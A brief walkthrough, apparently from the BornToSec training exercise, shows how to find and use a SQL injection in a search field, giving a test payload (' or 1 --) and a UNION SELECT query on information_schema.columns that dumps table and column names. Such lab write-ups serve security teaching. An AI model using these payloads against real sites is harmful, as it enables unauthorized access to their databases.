# BornToSec website is vulnerable to SQL-Injections.

# To check if a field is vulnerable, input the following line into search field:
' or 1 --

# Once the database identified (here MySql), input the following line to get all information on tables:
1 UNION (SELECT COLUMN_NAME, TABLE_NAME FROM information_schema.columns); --

# Here you are !
